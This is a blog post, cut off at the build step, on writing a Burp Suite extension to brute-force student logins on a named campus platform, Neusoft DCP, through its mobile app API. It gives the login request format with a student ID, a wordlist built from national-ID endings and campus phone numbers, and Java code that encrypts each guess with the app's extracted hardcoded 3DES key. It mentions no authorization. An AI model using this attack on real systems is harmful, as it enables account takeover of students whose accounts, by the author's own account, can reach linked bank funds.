@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Introduction
+Our campus network has officially gone into operation, but the username/password policy is still a default-password scheme: the password is the last six digits of the national ID number. For any platform that uses single sign-on (SSO), this is extremely dangerous."><title>Developing a Burp Suite Extension to Brute-Force a Platform&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Developing a Burp Suite Extension to Brute-Force a Platform" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">Developing a Burp Suite Extension to Brute-Force a Platform</h1><p class="article date">Wednesday, March 29, 2017<span class="langs"><span class="lang">
+                    <a href="/zh/posts/burpsuite-extension-for-bruteforcing-a-platform/" title="中文">
+                        <span class="lang-icon">🌐</span>中文</a>
+                </span></span></p></section><article class="article markdown-body"><h2 id="introduction">Introduction</h2>
+<p>Our campus network has officially gone into operation, but the username/password policy is still a default-password scheme: the password is the last six digits of the national ID number. For any platform that uses single sign-on (SSO), this is extremely dangerous.</p>
+<p>For example, if a university’s student IDs are publicly accessible online and the password is the last six digits of the ID number, then once you log into their campus card system you might be able to spend money from a student’s linked bank account.</p>
+<p>My school uses CAS to implement SSO, which makes brute-forcing inconvenient. So instead, I brute-forced via the platform app’s API.</p>
+<h2 id="prepare">Prepare</h2>
+<p>Environment:</p>
+<ul>
+<li>OS: Arch Linux</li>
+<li>Kernel: x86_64 Linux 4.9.8-1-ARCH</li>
+<li>Shell: zsh 5.3.1</li>
+<li>DE: KDE5</li>
+<li>IDE: IntelliJ IDEA 2016.1</li>
+<li>JDK: 1.8.0_121</li>
+<li>Build Tool: Gradle 3.3</li>
+</ul>
+<h2 id="quick-learning-the-api">Quick learning: the API</h2>
+<h3 id="interfaces-you-need-to-implement">Interfaces you need to implement</h3>
+<p><em>IBurpExtender</em></p>
+<p>All extensions must implement this interface. The implementation must be declared <code>public</code> and must provide a default (public, no-argument) constructor.</p>
+<blockquote>
+<p>All extensions must implement this interface. Implementations must be called BurpExtender, in the package burp, must be declared public, and must provide a default (public, no-argument) constructor.</p>
+</blockquote>
+<p><em>IIntruderPayloadGeneratorFactory</em></p>
+<p>Payload generator factory, used to provide payload generator instances.</p>
+<blockquote>
+<p>Extensions can implement this interface and then call IBurpExtenderCallbacks.registerIntruderPayloadGeneratorFactory() to register a factory for custom Intruder payloads.</p>
+</blockquote>
+<p><em>IIntruderPayloadProcessor</em></p>
+<p>Payload processor, used to process incoming parameters.</p>
+<blockquote>
+<p>Extensions can implement this interface and then call IBurpExtenderCallbacks.registerIntruderPayloadProcessor() to register a custom Intruder payload processor.</p>
+</blockquote>
+<h3 id="commonly-used-interfaces--methods">Commonly used interfaces / methods</h3>
+<p><em>IExtensionHelpers</em></p>
+<p>This interface contains many helper methods for common tasks in Burp extension development.</p>
+<blockquote>
+<p>This interface contains a number of helper methods, which extensions can use to assist with various common tasks that arise for Burp extensions. Extensions can call IBurpExtenderCallbacks.getHelpers to obtain an instance of this interface.</p>
+</blockquote>
+<p><em>registerExtenderCallbacks</em></p>
+<p>This method is invoked when the extension is loaded. It registers an instance of <code>IBurpExtenderCallbacks</code>, which provides many commonly used operations for plugin development.</p>
+<blockquote>
+<p>This method is invoked when the extension is loaded. It registers an instance of the IBurpExtenderCallbacks interface, providing methods that may be invoked by the extension to perform various actions.</p>
+</blockquote>
+<p><em>IIntruderPayloadGenerator</em></p>
+<p>This interface is used for custom Intruder payload generators. When starting a new Intruder attack, your extension registers an <code>IIntruderPayloadGeneratorFactory</code> and must return a new instance implementing this interface. This effectively registers your plugin as an Intruder payload generator.</p>
+<blockquote>
+<p>This interface is used for custom Intruder payload generators. Extensions that have registered an IIntruderPayloadGeneratorFactory must return a new instance of this interface when required as part of a new Intruder attack.</p>
+</blockquote>
+<h2 id="start">Start</h2>
+<h3 id="using-intruder">Using Intruder</h3>
+<p>Download the app, extract the DEX, convert it to a JAR, then analyze the encryption algorithm inside:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dex2jar mportal.dex
+</span></span><span class="line"><span class="cl">jd-gui mportal.jar
+</span></span></code></pre></div><p>The analysis process is described in a previous post:</p>
+<p><a href="https://gorgias.me/2015/06/14/%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%ADAndroid%E5%B9%B3%E5%8F%B0%E5%BA%94%E7%94%A8%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"target="_blank" rel="noopener noreferrer">Reverse Engineering a Campus Android Platform App</a></p>
+<p>First, use Burp Suite to capture the login request. Press <code>Ctrl + I</code> to send it to Intruder. Then add payload markers to the value after <code>action</code> (i.e., wrap it with <code>§</code> markers).</p>
+<p><img loading="lazy"  src="Intruder.png"
+        alt="Intruder"/></p>
+<p>Switch to the <strong>Payloads</strong> tab and set the type to <strong>Custom iterator</strong>.</p>
+<p><img loading="lazy"  src="payload.png"
+        alt="payload"/></p>
+<p>Then, based on what you found during decompilation, construct the plaintext that will be fed into the payload generator:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Position1: <span class="nv">method</span><span class="o">=</span>checkUserLoginIFS<span class="p">&amp;</span><span class="nv">idNumber</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">Position2: Student/staff ID is <span class="m">20135120100314</span>
+</span></span><span class="line"><span class="cl">Position3: <span class="p">&amp;</span><span class="nv">UserPwd</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">Position4: Import your password dictionary here
+</span></span><span class="line"><span class="cl">Position5: <span class="p">&amp;</span><span class="nv">logonIP</span><span class="o">=</span>8.8.8.8
+</span></span></code></pre></div><h3 id="preparing-the-wordlist">Preparing the wordlist</h3>
+<p>Besides weak passwords, you should also add a bit of social engineering. The default platform password is the last six digits of the national ID number.</p>
+<p>We used <code>crunch</code> to generate the <a href="https://mega.nz/#!ahxjSRZA!O5HLncoNVZePSzi_GkaQ2_-c_EdsIyXtp5_d5X1_67c"target="_blank" rel="noopener noreferrer">last six digits of the ID number</a>, and put candidates containing <code>X</code> at the end.</p>
+<p>We also included the school’s landline phone numbers. They were available for download from the official source, so there was no need to generate them ourselves.</p>
+<p><img loading="lazy"  src="tel.png"
+        alt="tel"/></p>
+<h3 id="writing-the-extension">Writing the extension</h3>
+<p>I didn’t use a payload <em>Generator</em> here, because I brute-forced using a pre-generated wordlist. If you want to generate values in code, you can implement the Generator interface.</p>
+<p><code>BurpExtender.java</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">burp</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">BurpExtender</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">IBurpExtender</span><span class="p">,</span><span class="w"> </span><span class="n">IIntruderPayloadProcessor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">IExtensionHelpers</span><span class="w"> </span><span class="n">helpers</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">registerExtenderCallbacks</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">IBurpExtenderCallbacks</span><span class="w"> </span><span class="n">callbacks</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// obtain an extension helpers object</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">helpers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">callbacks</span><span class="p">.</span><span class="na">getHelpers</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// set our extension name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">callbacks</span><span class="p">.</span><span class="na">setExtensionName</span><span class="p">(</span><span class="s">&#34;Neusoft DCP&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// register ourselves as an Intruder payload processor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">callbacks</span><span class="p">.</span><span class="na">registerIntruderPayloadProcessor</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getProcessorName</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;NeusoftDESEncode&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">processPayload</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">currentPayload</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">originalPayload</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">baseValue</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">dataParameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">helpers</span><span class="p">.</span><span class="na">bytesToString</span><span class="p">(</span><span class="n">currentPayload</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">EncryptData</span><span class="w"> </span><span class="n">enc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">EncryptData</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">helpers</span><span class="p">.</span><span class="na">stringToBytes</span><span class="p">(</span><span class="n">enc</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">dataParameter</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><code>EncryptData.java</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">burp</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.crypto.Cipher</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.crypto.SecretKey</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.crypto.SecretKeyFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.crypto.spec.DESedeKeySpec</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EncryptData</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">EncryptData</span><span class="w"> </span><span class="n">SingleEncryptData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">encryptKey</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">DESedeKeySpec</span><span class="w"> </span><span class="n">spec</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">SecretKeyFactory</span><span class="w"> </span><span class="n">keyFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="n">SecretKey</span><span class="w"> </span><span class="n">theKey</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="n">IvParameterSpec</span><span class="w"> </span><span class="n">IvParameters</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">EncryptData</span><span class="w"> </span><span class="nf">getInstance</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SingleEncryptData</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">SingleEncryptData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">EncryptData</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">SingleEncryptData</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">EncryptData</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Cipher</span><span class="w"> </span><span class="n">localCipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;DESede&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Installling SunJCE provider.&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">encryptKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;neusofteducationplatform&#34;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">encryptKey</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">spec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DESedeKeySpec</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">encryptKey</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">keyFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SecretKeyFactory</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;DESede&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">theKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">keyFactory</span><span class="p">.</span><span class="na">generateSecret</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">spec</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;DESede/CBC/PKCS5Padding&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">IvParameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IvParameterSpec</span><span class="p">(</span><span class="s">&#34;01234567&#34;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">localException2</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">rawString</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">encryptedString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">theKey</span><span class="p">,</span><span class="w"> </span><span class="n">IvParameters</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">plaintBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rawString</span><span class="p">.</span><span class="na">getBytes</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">encryptedString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">plaintBytes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">localException</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">byteToHex</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">HEXBYTES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">48</span><span class="p">,</span><span class="w"> </span><span class="n">49</span><span class="p">,</span><span class="w"> </span><span class="n">50</span><span class="p">,</span><span class="w"> </span><span class="n">51</span><span class="p">,</span><span class="w"> </span><span class="n">52</span><span class="p">,</span><span class="w"> </span><span class="n">53</span><span class="p">,</span><span class="w"> </span><span class="n">54</span><span class="p">,</span><span class="w"> </span><span class="n">55</span><span class="p">,</span><span class="w"> </span><span class="n">56</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">57</span><span class="p">,</span><span class="w"> </span><span class="n">97</span><span class="p">,</span><span class="w"> </span><span class="n">98</span><span class="p">,</span><span class="w"> </span><span class="n">99</span><span class="p">,</span><span class="w"> </span><span class="n">100</span><span class="p">,</span><span class="w"> </span><span class="n">101</span><span class="p">,</span><span class="w"> </span><span class="n">102</span><span class="w"> </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">HEXINDEX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;0123456789abcdef0123456789ABCDEF&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">byteToHex</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[</span><span class="n">len</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">2</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xFF</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="o">[</span><span class="p">(</span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">HEXBYTES</span><span class="o">[</span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">4</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xF</span><span class="p">)</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="o">[</span><span class="p">(</span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">HEXBYTES</span><span class="o">[</span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xF</span><span class="p">)</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="build-the-extension-jar-and-import-it">Build the extension JAR and import it</h3>
+<p>The project uses Gradle. Running the following in the project directory will output a JAR to the specified directory:</p>
